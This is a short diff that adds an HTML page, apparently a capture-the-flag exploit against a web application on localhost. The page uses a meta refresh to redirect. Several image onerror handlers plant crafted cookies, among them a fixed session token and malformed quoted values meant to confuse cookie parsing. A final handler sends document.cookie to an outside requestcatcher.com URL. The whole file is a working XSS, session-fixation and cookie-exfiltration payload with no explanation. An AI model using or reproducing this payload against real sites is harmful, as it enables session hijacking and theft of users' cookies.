@@ -1,0 +1,9 @@
+</body>
+<head>
+  <meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
+</head>
+<body>
+  <img src=x onerror='document.cookie="RESSION=1\"; Path=/public; domain=localhost"'>
+  <img src=x onerror='document.cookie="SESSION=ba50786aa72989dee26e8af211e06879; Path=/public; domain=localhost"'>
+  <img src=x onerror='document.cookie="FLAg=\"1; Path=/public; domain=localhost"'>
+  <img src="x" onerror='var xhr = new XMLHttpRequest();xhr.open("GET", "https://1234.requestcatcher.com/leak?token=" + encodeURIComponent(document.cookie), false);xhr.send();'>
